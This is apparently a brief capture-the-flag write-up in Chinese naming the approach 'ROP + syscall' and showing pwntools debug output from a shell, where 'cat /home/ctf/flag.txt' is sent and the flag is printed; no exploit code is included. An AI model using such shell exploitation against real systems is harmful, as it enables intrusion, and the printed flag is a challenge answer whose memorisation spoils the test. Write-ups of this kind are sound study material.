# 思路
ROP + syscall

# getshell
```
[DEBUG] Sent 0x17 bytes:
    b'cat /home/ctf/flag.txt\n'
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'

[DEBUG] Received 0x9 bytes:
    b'Hello, !\n'
Hello, !
[DEBUG] Received 0x74 bytes:
    b'Hello, /bin/sh!\n'
    b'NHNC{a_rop_challenge_which_LemonTea_can_solve_and_i_wanna_sleep_lemontea_u_sucker_6f325c6517bd7789}\n'
Hello, /bin/sh!
NHNC{a_rop_challenge_which_LemonTea_can_solve_and_i_wanna_sleep_lemontea_u_sucker_6f325c6517bd7789}

```

![](https://r2.20161023.xyz/pic/20250707143623539.png)